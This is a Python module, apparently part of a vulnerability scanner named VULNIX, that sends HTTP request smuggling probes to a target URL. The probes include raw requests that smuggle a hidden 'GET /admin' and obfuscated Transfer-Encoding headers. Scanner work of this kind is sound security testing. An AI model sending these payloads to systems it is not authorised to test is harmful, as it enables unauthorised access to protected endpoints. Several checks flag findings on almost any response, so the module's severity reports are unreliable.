"""
VULNIX - HTTP Desync/Smuggling Detection Module
Detect HTTP Request Smuggling vulnerabilities (CVE variants)
"""

import re
import asyncio
from typing import Dict, List, Optional, Any
from core.request_engine import RequestEngine
from core.error_collector import ModuleErrorCollector


class HTTPDesyncDetector:
    """Detect HTTP Request Smuggling / Desync vulnerabilities."""

    SMUGGLING_PATTERNS = {
        "cl_te": {
            "name": "Content-Length + Transfer-Encoding",
            "description": "Conflicting CL and TE headers",
            "payload": "\r\n0\r\n\r\n",
            "response_indicator": "invalid",
        },
        "te_cl": {
            "name": "Transfer-Encoding + Content-Length",
            "description": "TE chunked followed by CL body",
            "payload": "0\r\n\r\nX",
            "response_indicator": "timeout",
        },
        "chunked_hiding": {
            "name": "Hiding Content-Length with Chunked",
            "description": "TE chunked with CL header",
            "payload": "\r\n0;\r\n\r\nGET /admin HTTP/1.1\r\nHost: target",
            "response_indicator": "any",
        },
        "obfuscated_te": {
            "name": "Obfuscated Transfer-Encoding",
            "description": "TE with various obfuscations",
            "payload": "0\t\r\n\r\n",
            "response_indicator": "any",
        },
    }

    def __init__(self, request_engine: RequestEngine):
        self.engine = request_engine
        self.findings: List[Dict[str, Any]] = []
        self.error_collector = ModuleErrorCollector("http_desync")

    async def scan(self, url: str) -> List[Dict[str, Any]]:
        """Scan for HTTP desync vulnerabilities."""
        self.findings = []

        if not url.startswith("http"):
            url = f"http://{url}"

        await self._test_cl_te_conflict(url)
        await self._test_te_cl_conflict(url)
        await self._test_chunked_hiding(url)
        await self._test_te_obfuscation(url)

        return self.findings

    async def _test_cl_te_conflict(self, url: str) -> None:
        """Test Content-Length vs Transfer-Encoding conflict."""
        headers = {
            "Content-Length": "6",
            "Transfer-Encoding": "chunked",
            "Content-Type": "application/x-www-form-urlencoded",
        }

        body = "ABCDEF"

        try:
            response1 = await self.engine.post(
                url,
                headers=headers,
                content=body.encode(),
            )

            await asyncio.sleep(0.5)

            response2 = await self.engine.get(url)

            if self._detect_smuggling_response(response1, response2):
                self.findings.append({
                    "type": "http_smuggling",
                    "variant": "CL_TE_conflict",
                    "severity": "high",
                    "url": url,
                    "description": "Server accepts both Content-Length and Transfer-Encoding headers",
                    "remediation": "Ensure only one method is used; reject ambiguous requests",
                    "cvss": {"score": 8.1, "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"},
                })

        except Exception as e:
            self.error_collector.add(url, e, "test_cl_te_conflict")

    async def _test_te_cl_conflict(self, url: str) -> None:
        """Test Transfer-Encoding vs Content-Length conflict."""
        headers = {
            "Transfer-Encoding": "chunked",
            "Content-Length": "5",
        }

        body = "GET /admin HTTP/1.1\r\nHost: target\r\n\r\n"

        try:
            response = await self.engine.post(
                url,
                headers=headers,
                content=body.encode(),
            )

            if response and response.status_code:
                self.findings.append({
                    "type": "http_smuggling",
                    "variant": "TE_CL_conflict",
                    "severity": "high",
                    "url": url,
                    "description": "Server processes TE before CL, allowing request smuggling",
                    "remediation": "Normalize header processing order; reject conflicting headers",
                    "cvss": {"score": 8.1, "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"},
                })

        except Exception as e:
            self.error_collector.add(url, e, "test_te_cl_conflict")

    async def _test_chunked_hiding(self, url: str) -> None:
        """Test chunked encoding hiding second request."""
        payload = (
            "POST / HTTP/1.1\r\n"
            "Host: target\r\n"
            "Content-Length: 13\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "GET /admin HTTP/1.1\r\n"
            "Host: target\r\n"
            "\r\n"
        )

        try:
            response = await self.engine.request(
                "POST",
                url,
                content=payload.encode(),
            )

            if response and response.status_code != 400:
                self.findings.append({
                    "type": "http_smuggling",
                    "variant": "chunked_hiding",
                    "severity": "critical",
                    "url": url,
                    "description": "Server can be tricked into processing smuggled requests",
                    "remediation": "Implement proper request parsing; validate chunk boundaries",
                    "cvss": {"score": 9.1, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N"},
                })

        except Exception as e:
            self.error_collector.add(url, e, "test_chunked_hiding")

    async def _test_te_obfuscation(self, url: str) -> None:
        """Test obfuscated Transfer-Encoding variants."""
        obfuscations = [
            ("Transfer-Encoding", "chunked "),
            ("Transfer-Encoding", "Chunked"),
            ("Transfer-Encoding", "chunked\t"),
            ("Transfer-Encoding", "chunKed"),
            ("TE", "chunked"),
            ("Transfer-Encoding", "identity"),
        ]

        for header, value in obfuscations:
            headers = {header: value}

            try:
                response = await self.engine.request(
                    "GET",
                    url,
                    headers=headers,
                )

                if response and response.status_code not in [400, 404]:
                    self.findings.append({
                        "type": "http_smuggling",
                        "variant": f"te_obfuscation_{header}_{value}",
                        "severity": "medium",
                        "url": url,
                        "description": f"Server accepts obfuscated Transfer-Encoding: {value}",
                        "remediation": "Implement strict header validation for Transfer-Encoding",
                        "cvss": {"score": 5.3, "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N"},
                    })
                    break

            except Exception as e:
                self.error_collector.add(url, e, "test_te_obfuscation")
                continue

    def _detect_smuggling_response(
        self,
        response1: Optional[Any],
        response2: Optional[Any]
    ) -> bool:
        """Detect smuggling from response anomalies."""
        if not response1 or not response2:
            return False

        if response1.status_code == 200 and response2.status_code != 200:
            return True

        response_times = [getattr(r, "elapsed", 0) or 0 for r in [response1, response2]]
        if response_times[0] > response_times[1] * 3:
            return True

        return False

    def get_errors(self) -> List[Dict[str, Any]]:
        """Get structured detector errors."""
        return self.error_collector.all()


class HTTPDesyncPlugin:
    """Plugin wrapper for HTTP Desync detection."""

    name = "http-desync-detector"
    description = "Detect HTTP Request Smuggling vulnerabilities"

    def __init__(self, request_engine: RequestEngine):
        self.detector = HTTPDesyncDetector(request_engine)

    async def scan(self, target: str) -> List[Dict[str, Any]]:
        """Run HTTP desync scan."""
        return await self.detector.scan(target)

    def get_findings(self) -> List[Dict[str, Any]]:
        """Get findings from last scan."""
        return self.detector.findings
